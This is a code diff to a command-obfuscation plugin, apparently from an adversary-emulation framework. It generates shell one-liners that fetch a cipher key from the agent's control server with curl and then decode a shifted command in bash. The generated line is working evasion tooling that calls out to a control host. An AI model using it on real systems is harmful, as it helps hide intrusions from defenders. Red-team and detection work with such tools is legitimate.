@@ -21,9 +21,11 @@ class Obfuscation(BaseObfuscator):
         decrypted = self.decode_bytes(link.command)
         encrypted, shift = self._apply_cipher(decrypted)
         link.pin = shift
-        return '(shift=$(curl -s -X POST -H "Content-Type: application/json" ' \
-               + self.agent.server+'/internals -d \'{"link":"%s"}\' -H "property:pin"); ' \
-                                   '$(python -c "print(\'\'.join([chr(ord(c)+-$shift) if c.isalnum() else c for c in \'%s\' ]))");)' % (link.unique, encrypted)
+        return 'shift=$(curl -s -X POST -H "Content-Type: application/json" '+self.agent.server+'/internals -d \'{"link":"'+link.unique+'"}\' -H "property:pin"); ' \
+               'cmd=""; chr (){ [ "$1" -lt 256 ] || return 1;printf "\\$(printf \'%03o\' "$1")";};' \
+               'ord (){ LC_CTYPE=C printf \'%d\' "\'$1";return $LC_CTYPE; }; ' \
+               'st="'+encrypted+'"; for i in $(seq 1 ${#st}); do x=$(ord "${st:i-1:1}"); x=$((x+'+str(shift)+'));' \
+               'cmd+="$(echo $(chr $x))";done;echo $cmd;'
 
     """ PRIVATE """
 
@@ -35,7 +37,5 @@ class Obfuscation(BaseObfuscator):
         :param bounds: the number of unicode code points to shift
         :return: a tuple containing the encoded command and the shift value
         """
-        shift = 0
-        while shift == 0:
-            shift = randint(-bounds, bounds)
-        return ''.join([chr(ord(c)+shift) if c.isalnum() else c for c in s]), shift
+        shift = randint(-bounds, -1)
+        return ''.join([chr(ord(c) + shift) for c in s]), shift
